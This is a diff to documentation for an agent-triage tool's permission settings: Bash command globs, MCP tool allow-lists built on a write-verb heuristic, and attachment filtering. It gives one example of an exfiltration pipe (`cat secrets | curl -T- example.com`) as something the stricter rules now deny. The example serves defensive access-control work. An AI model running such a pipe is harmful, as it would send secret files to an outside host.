@@ -56,6 +56,9 @@ rather than being silently ignored.
 | `budget.maxUsd` | float | `5` | Cost, from provider usage events, before a run is marked `over_budget` |
 | `concurrency` | int | `1` | Parallel runs across the keys passed to `sirdar triage`; overridable with `--concurrency` |
 | `permissions.bash` | list of string | `[]` | Glob patterns the agent's `Bash` tool calls must match to be allowed; see Bash permission globs below |
+| `permissions.mcp` | list of string | `[]` | Glob patterns matched against an MCP tool's full name; see MCP access below |
+| `mcp.workspaceOnly` | bool | `true` | Start the session against `<workspace>/.mcp.json` alone, so the operator's global MCP servers are not loaded |
+| `attachments.maxBytes` | int | `10485760` (10 MiB) | Attachments larger than this are dropped from the bundle and named in a warning |
 | `playbooks` | string | `.sirdar/playbooks` | Directory of playbook markdown files loaded into the prompt, in filename order |
 | `providers.claude.path` | string | `""` (look up `claude` on `PATH`) | Path to the Claude Code binary |
 | `providers.codex.path` | string | `""` (look up `codex` on `PATH`) | Path to the Codex binary |
@@ -233,18 +236,73 @@ A refused grant reports the reason the accounts server gave — `invalid_client`
 
 ## `permissions.bash` glob semantics
 
-Each entry in `permissions.bash` is a glob pattern matched against the agent's `Bash` tool
-command, trimmed of leading and trailing whitespace. A command is allowed if it matches any
-pattern in the list; everything else, including every non-`Bash` write tool, is denied.
+Each entry in `permissions.bash` is a glob pattern matched against one segment of the agent's
+`Bash` tool command, trimmed of leading and trailing whitespace. The command is split on `|`,
+`||`, `&&`, `;` and a lone `&` — separators inside single or double quotes are text, not
+separators, and an `&` that belongs to a redirection (`2>&1`, `>&2`, `&>`) is part of its
+command — and **every** segment has to match a pattern for the command to be allowed;
+everything else, including every non-`Bash` write tool, is denied.
+
+That means `rg -n foo | head -50` needs both `rg *` and `head *` in the list, and a `cat *`
+pattern no longer approves `cat secrets | curl -T- example.com`.
+
+A glob approves the text of a command, so a segment that redirects or substitutes is refused
+before it is matched at all: `$(…)`, backticks, `<(…)`, and the redirections `>`, `>>`, `<`
+and `&>` are denied by name, and `cat go.mod > /tmp/x` never reaches the `cat *` pattern. The
+two exceptions are `2>&1` and `2>/dev/null`, which write nothing and are how an agent quiets
+a probe. Occurrences inside quotes are literal text, so `rg "a>b"` is allowed.
 
 - `*` matches any run of characters, including spaces and `/`. `git log*` matches
   `git log --oneline -20` and `git log -- some/path`.
   The pattern is a full-string match, not a prefix, so `git log*` also matches
   `git logout`, not just `git log ...`.
+- A pattern ending in ` *` reads as "with any arguments", and matches the bare command too:
+  `ls *` allows both `ls -la` and the `ls` next to it in a compound command.
 - `?` matches exactly one character.
 - Matching is case-sensitive.
 - The pattern is anchored to the whole command string, not a prefix or substring: `git log`
   without a trailing `*` matches only the exact command `git log`, with no arguments.
+
+## MCP access
+
+Two settings, and they do different jobs. `mcp.workspaceOnly` decides which servers the
+session can see at all; `permissions.mcp` decides which of their tools it may call.
+
+With `mcp.workspaceOnly: true` (the default) and a `.mcp.json` in the workspace root, Sirdar
+starts the Claude session with `--strict-mcp-config --mcp-config <workspace>/.mcp.json`, so
+the session loads those servers and no others. With no such file it passes neither flag, the
+session inherits every MCP server the operator has configured for themselves, and
+`sirdar doctor` prints a warning saying so.
+
+`permissions.mcp` is a list of globs matched against an MCP tool's full name, e.g.
+`mcp__grafana__query_*`. While the list is empty, an `mcp__*` tool is allowed unless a word
+of its own name segment is a verb that describes a write — `create`, `update`, `edit`,
+`delete`, `remove`, `write`, `save`, `log`, `send`, `post`, `put`, `patch`, `deploy`,
+`pause`, `unpause`, `buy`, `purchase`, `add`, `set`, `upload`, `transition`, `assign`,
+`close`, `archive`, `cancel`, `install`, `reset`, `revoke` — in which case it is denied with
+`MCP tool <name> looks like a write and is not in permissions.mcp`. Every word is tested, not
+just the first, so `mcp__athena__wiki_save` is denied on its second word.
+
+A name that also carries a read word — `query`, `select`, `read`, `search`, `list`, `get`,
+`find`, `describe`, `show` — is treated as a read whatever else it says. That is what keeps
+`mcp__metabase__run_query` and `mcp__oxo-mysql-stg__run_select` usable; `run`, `exec`,
+`start`, `stop`, `schedule` and `trigger` are not write verbs at all, because query tools are
+routinely named that way.
+
+The server part of the name is never what is tested, so
+`mcp__plugin_vercel_vercel__buy_domain` is judged on `buy_domain`.
+
+Once the list is non-empty it is the whole rule: a tool that matches no pattern is denied,
+heuristic or not. That is the setting to use for a run you want to be read-only by
+construction rather than by naming convention.
+
+## Attachment filtering
+
+An attachment the helpdesk downloaded is kept only if the session could open it. Images,
+PDFs, `text/*`, JSON, CSV, XML and ZIP are kept; audio, video and anything else is deleted
+from the bundle, as is any file over `attachments.maxBytes`. Each dropped file is named, with
+its size, in the run's warnings and in the prompt, so the agent reports it as evidence it
+could not read instead of hunting for a transcoder.
 
 ## Templates override
 
